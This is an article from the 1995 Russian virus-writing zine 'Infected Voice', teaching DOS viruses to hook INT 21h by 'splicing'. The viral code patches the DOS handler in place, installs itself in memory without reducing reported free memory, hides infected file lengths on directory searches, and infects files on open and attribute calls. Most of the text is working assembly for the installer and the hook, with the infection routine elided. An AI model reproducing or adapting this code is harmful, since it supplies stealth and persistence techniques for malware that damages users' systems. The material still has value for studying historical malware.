█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█  ▀					    ▀	       ██▀██▀██
█ STEALTH group	█░ █ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▀█▀ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ ▄▀▀  ██ ▀▀ ██
█   presents	█░ █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █  ▀█▀▀  █████ ██
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█░ ▐ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄  █████▄██
 ░░░░░░░░░░░░░░░░░                                                     JAN 1995

  INFECTED VOICE. Issue 4. January 1995. (C) STEALTH group, Kiev 148, Box 10.
  ---------------------------------------------------------------------------

    Предлагаю ▄▄▄▄ НЕСТАНДАТРТНЫЙ СПОСОБ ПЕРЕХВАТА INT 21 ▄▄▄▄, который заклю-
чается в том, что мы будем не устанавливать int 21 на себя,а затем передавать 
управление старому обработчику, а заменим часть обработчика ДОСа на int DD. 
    Работа замещенного кода будет проэмулирована вирусом.
    Этот способ получения управления также носит название сплайсинг.
Существует множество методов реализации сплайсинга. Самый простой из них
представлен ниже. Замечу, что он работоспособен на PS-DOS 3.30, MS-DOS 5.0.
Для других версий ДОС тестирование не проводилось, поэтому трудно говорить
что-либо о MS-DOS 6.0, 6.1, 6.22, 7.0. Следовательно Вам предоставляется воз-
можность поэксперементировать с этими версиями.
    Небольшое замечание относительно инсталлятора в память.Для размещения
вируса в памяти мы применяем простой алгоритм: 
     1) уменьшить MCB выполняемой программы до 1000h параграфов (65536 байт );
     2) выделить MCB блок функцией 48h; 
     3) переустановить владельца блока на свой ;
     4) переписать тело вируса в блок;
     5) перехватить int 21.
Таким образом мы внедряемся внутрь памяти. И поэтому общее количество памяти
не изменится. Это большое преимущество, так как простое нажатие ctrl+L в
Norton Commander обрадует привычным 655.360 bytes Total Memory.

Примечание:  метод доступа к местам сплайсинга был позаимствован у вируса DIR.

;--- Эта процедура реализует инсталлятор и сплайсинг.
;--- вызовите ее так: call setup
setup:
		pop	si
		push	si
		sub	si,4	; смещение между (за вызовом процедуры и
		push	es	; началом вируса )
		mov	ah,52h
		int	21h
		mov	di,es:[bx+4]	; в di указатель на список таблиц
					; файлов в ДОС
		les	di,es:[di-4]	; 
find21_1:
		dec	di
		cmp	word ptr es:[di-2],0E18Ah      ; код команды mov ah,cl
		jne	find21_1
		mov	word ptr ds:[Real_off21+si],di ; находим адрес int 21h
		mov	word ptr ds:[Real_seg21+si],es ; для настоящего ДОСа
		pop	es

		mov	bx,cs
		mov	ax,es		; es - сегмент PSP
		sub	bx,ax
		add	bx,1000h
		mov	ah,4Ah
		call	int21
		jnc	standart
;--- инсталлятор в память
		mov	ax,es
		dec	ax
		mov	ds,ax
		mov	bx,ds:[0003]  ; allocated paras
		sub	bx,lenPar+1	; требуемое кол-во памяти в параграфах
		mov	ah,4Ah
		call	int21
;--- выделить блок 
standart:
		mov	ah,48h	      ; gettin block to ax
		mov	bx,lenPar
		call	int21
		jc	memoryErr
		mov	es,ax
SetOwnerPara:
		dec	ax	      ; ax=NewSeg
		mov	ds,ax
		mov	word ptr ds:[0001],es	   ; ставим сегмент владельца на
						   ; cвой сегмент
		xor	di,di
		push	cs
		pop	ds
		mov	cx,(offset lengthVirus-correct+16)/2 	; длина вируса в
		rep	movsw					; словах
		push	es	; ds=es=сегмент вируса в памяти
		pop	ds
		mov	dx,offset int21Entry-correct
		mov	ax,25DDh		; установить int DD
		int	21h
;--- так как ds - сегмент вируса в памяти и Real_off21 было заполнено до
;--- копирования в память ==> его значение продублировалось
		lds	si,dword ptr ds:Real_off21
findJa1:
		lodsb
		cmp	al,0CDh  ; int ??
		je	foundJa1
		cmp	al,077h         ; найдем команду ja xx и заменим 
				        ; ее на int DD
		jne	findJa1
foundJa1:
		lea	dx,[si+6]
		mov	ax,25DEh	; int DE рекомендую использовать
		call	int21		; для вызова функции ДОС 40h
		dec	si
		mov	[si],0DDCDh	; вот,собственно,замена
		ret

;--- int 21 для вызова программой
int21		proc
		pushf
		cli
		db	9Ah
Real_off21	equ	$-correct
		dw	?
Real_seg21	equ	$-correct
		dw	?
		ret
int21		endp

;--- int 21 для обработки прерывания
int21Entry:
		pushf
;--- здесь идут проверки функций ДОСа
		cmp	ah,4Eh
		je	hide
		cmp	ah,4Fh
		je	hide
		cmp	ah,3Dh
		je	infected
		cmp	ah,43h
		je	infected
exit:
		popf
		ja	mov_al_0 ; эмуляция комманды, замещенной на INT 0DDh
				 ; Данная комманда присутствует во всех 
				 ; обработчиках DOS, означающая переход 
				 ; в случае несуществующей функции DOS
		iret		 ; передать управление ДОС
mov_al_0:
		xor	al,al
		add	sp,6	 ; убрать из стека 3 регистра
		iret
hide:
		push	si di bx es

;--- здесь идут проверки на необходимость маскирования длины файла
;		. . . . .
;		. . . . .
;		. . . . .
;		. . . . .
;		. . . . .
findOk:
		pop	es bx di si
		add	sp,8   		; убрать из стека 4 регистра
		clc
popArea:
;--- выйти без возврата в ДОС
		retf	2
findBad:
		pop	es bx di si
		add	sp,8   ; убрать из стека 4 регистра
		stc
		jmp	short popArea
infected:
		push	ax bx cx dx ds es si di
;--- здесь делаются проверки и происходит заражение файла
;		. . . . .
;		. . . . .
;		. . . . .
;		. . . . .
;		. . . . .
;		. . . . .
;--- восстановим регистры
		pop	di si es ds dx cx bx ax
		jmp	exit

	Данные методы успешно находят свое применение в вирусах автора.


 Желаю удачи. Populizer.	6-6-66. 6:06:06